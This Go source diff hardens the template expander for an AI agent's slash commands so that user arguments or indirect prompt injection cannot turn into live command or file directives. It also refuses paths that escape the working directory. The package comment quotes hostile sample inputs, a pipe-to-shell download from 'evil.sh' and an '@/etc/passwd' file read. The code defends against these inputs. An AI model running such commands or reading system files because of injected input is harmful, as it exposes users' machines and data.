@@ -2,9 +2,18 @@
 // one invocation. It is self-contained: given a body, a raw argument string,
 // and the session's execution environment, it substitutes $ARGUMENTS/$1..$9,
 // runs !`cmd` backtick spans, and inlines @file references.
+//
+// Safety invariant: only a !`cmd`/@file directive written IN THE TEMPLATE can
+// execute a command or read a file. $ARGUMENTS/$1..$9 are always substituted
+// as inert text — a user (or an indirect prompt injection) supplying an
+// argument that merely looks like "!`curl evil.sh | sh`" or "@/etc/passwd"
+// must never turn into a live directive. Expand enforces this by locating
+// every directive span ONCE, over the raw pre-substitution template; argument
+// substitution then only ever touches the literal text between those spans.
 package command
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 	"os"
@@ -21,18 +30,23 @@ import (
 // output bound (session_tools_shell.go shellToolResultDefaultMaxChars).
 const maxInlineBytes = 30_000
 
+// pathTrailingPunctuation is stripped from the end of a raw "@\S+" regex
+// match before it is treated as a file path, so ordinary sentence punctuation
+// immediately following a mention — "per @notes.txt.", "(see @docs/x.md)" —
+// isn't folded into the looked-up filename. The stripped characters are put
+// back as literal text after the directive is resolved.
+const pathTrailingPunctuation = ".,;:!?)]}'\""
+
 // positionalPattern matches $1..$9. The trailing \b excludes $10, $11, ...
 // (only single-digit positions 1-9 are supported) since a digit followed by
 // another digit is not a word boundary.
 var positionalPattern = regexp.MustCompile(`\$([1-9])\b`)
 
-// cmdOrFilePattern matches a !`command` backtick span or an @file reference in
-// a single alternation so ReplaceAllStringFunc visits both in one left-to-right
-// scan of the ORIGINAL text. That single pass is what keeps the two
-// substitutions from contaminating each other: a file's contents are never
-// re-scanned for !`cmd` spans (so reading a file can't trigger command
-// execution), and a command's stdout is never re-scanned for @file references
-// (so running a command can't trigger a further file read).
+// cmdOrFilePattern matches a !`command` backtick span or a candidate @file
+// reference. Expand walks these matches once over the RAW template (see the
+// package doc's safety invariant); a candidate @file match is further
+// validated by resolveAtFileSpan, which rejects a mid-token "@" (e.g. an
+// email address) and trims trailing sentence punctuation from the path.
 var cmdOrFilePattern = regexp.MustCompile("!`[^`]*`|@\\S+")
 
 // Expand renders a slash command's markdown body for one invocation:
@@ -46,12 +60,15 @@ var cmdOrFilePattern = regexp.MustCompile("!`[^`]*`|@\\S+")
 //     an inline "[error reading ...]" marker rather than failing the whole
 //     expansion.
 //
-// Substitutions run in that order over progressively-expanded text — so
-// $ARGUMENTS/$1.. substitution happens first and its output can itself contain
-// !`cmd`/@file syntax (e.g. a template of "@$1" with $1 substituted to a
-// path) — except !`cmd` and @file themselves, which are resolved together in
-// a single pass (see cmdOrFilePattern) precisely so neither's OUTPUT is
-// re-interpreted as the other's syntax.
+// Expand makes one left-to-right pass over the RAW body to locate !`cmd`/@file
+// directive spans (cmdOrFilePattern), then walks those spans in order: each
+// directive is executed/read using the template's own literal text (never
+// argument-substituted), and each literal segment BETWEEN directives has
+// $ARGUMENTS/$1.. substituted into it as inert output text. Because the scan
+// runs once, before any substitution, argument text can never open a new
+// directive (see the package doc), a file's contents are never re-scanned for
+// !`cmd` spans, and a command's stdout is never re-scanned for @file
+// references.
 //
 // The only error Expand itself returns is ctx already being done at entry;
 // every per-token failure (a failing command, a missing file) degrades to
@@ -61,15 +78,62 @@ func Expand(ctx context.Context, body string, args string, env execenv.Execution
 		return "", err
 	}
 
-	body = substituteArguments(body, args)
-	body = cmdOrFilePattern.ReplaceAllStringFunc(body, func(match string) string {
+	var out strings.Builder
+	last := 0
+	for _, loc := range cmdOrFilePattern.FindAllStringIndex(body, -1) {
+		start, end := loc[0], loc[1]
+		match := body[start:end]
 		if strings.HasPrefix(match, "!`") {
+			out.WriteString(substituteArguments(body[last:start], args))
 			cmd := strings.TrimSuffix(strings.TrimPrefix(match, "!`"), "`")
-			return runInlineCommand(ctx, cmd, env)
+			out.WriteString(runInlineCommand(ctx, cmd, env))
+			last = end
+			continue
 		}
-		return readInlineFile(strings.TrimPrefix(match, "@"), env)
-	})
-	return body, nil
+		path, directiveEnd, ok := resolveAtFileSpan(body, start, end)
+		if !ok {
+			// Not actually a directive (e.g. the "@" in an email address):
+			// leave it as literal text for the next segment to pick up.
+			continue
+		}
+		out.WriteString(substituteArguments(body[last:start], args))
+		out.WriteString(readInlineFile(path, env))
+		last = directiveEnd
+	}
+	out.WriteString(substituteArguments(body[last:], args))
+	return out.String(), nil
+}
+
+// atFileBoundaryOK reports whether the "@" at body[start] opens a new @file
+// directive rather than sitting mid-token — e.g. the "@" in an email address
+// like "foo@example.com" must not be treated as a directive. A directive must
+// sit at the start of the body or be preceded by whitespace or "(".
+func atFileBoundaryOK(body string, start int) bool {
+	if start == 0 {
+		return true
+	}
+	switch body[start-1] {
+	case ' ', '\t', '\n', '\r', '(':
+		return true
+	default:
+		return false
+	}
+}
+
+// resolveAtFileSpan validates and trims a raw "@\S+" match at body[start:end].
+// ok is false when the match doesn't open a directive at all (atFileBoundaryOK
+// fails), in which case the caller must leave the match as literal text.
+// Otherwise it returns the candidate file path — the match with its leading
+// "@" and any trailing sentence punctuation (pathTrailingPunctuation) removed
+// — and the directive's true end offset, so the caller resumes literal-text
+// scanning at the stripped punctuation instead of swallowing it into the path.
+func resolveAtFileSpan(body string, start, end int) (path string, directiveEnd int, ok bool) {
+	if !atFileBoundaryOK(body, start) {
+		return "", 0, false
+	}
+	raw := strings.TrimPrefix(body[start:end], "@")
+	trimmed := strings.TrimRight(raw, pathTrailingPunctuation)
+	return trimmed, end - (len(raw) - len(trimmed)), true
 }
 
 // substituteArguments replaces $ARGUMENTS with the full argument string and
@@ -99,14 +163,26 @@ func runInlineCommand(ctx context.Context, cmd string, env execenv.ExecutionEnvi
 }
 
 // readInlineFile reads the file at path, resolved relative to env's working
-// directory, and returns its (bounded) contents. A read failure (missing
-// file, permission error, directory, ...) degrades to an inline marker
-// instead of failing the whole expansion.
+// directory, and returns its (bounded) contents. Unlike serf's other file
+// reads (e.g. the model's Read tool), which are intentionally unsandboxed,
+// @file expansion runs synchronously during argument substitution with no
+// hook or permission visibility — so path must be lexically local
+// (filepath.IsLocal): non-local paths (absolute, or "../"-escaping) are
+// refused rather than read. A binary file (containing a NUL byte) degrades to
+// a marker instead of inlining bytes that would corrupt the prompt. Any other
+// read failure (missing file, permission error, directory, ...) also degrades
+// to an inline marker instead of failing the whole expansion.
 func readInlineFile(path string, env execenv.ExecutionEnvironment) string {
+	if !filepath.IsLocal(path) {
+		return fmt.Sprintf("[refusing @%s: escapes working directory]", path)
+	}
 	full := filepath.Join(env.WorkingDirectory(), path)
 	data, err := os.ReadFile(full)
 	if err != nil {
 		return fmt.Sprintf("[error reading %s: %v]", path, err)
+	}
+	if bytes.IndexByte(data, 0) >= 0 {
+		return fmt.Sprintf("[binary file %s: %d bytes, not inlined]", path, len(data))
 	}
 	return boundText(string(data))
 }
